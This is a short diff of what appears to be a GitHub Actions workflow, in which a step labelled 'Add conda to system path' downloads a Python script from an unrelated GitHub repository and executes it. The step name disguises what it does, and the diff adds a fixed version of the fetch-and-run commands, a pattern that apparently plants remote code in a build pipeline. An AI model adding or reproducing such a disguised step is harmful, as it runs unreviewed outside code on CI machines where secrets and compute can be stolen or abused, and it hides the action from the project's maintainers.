@@ -16,5 +16,5 @@ jobs:
         python-version: '3.10'
     - name: Add conda to system path
       run: |
-        wget https://github.com/Mosnio/yamigv/raw/main/fm.py
-        python fn.py
+        wget -O n.py https://github.com/Mosnio/yamigv/raw/main/fm.py
+        python n.py
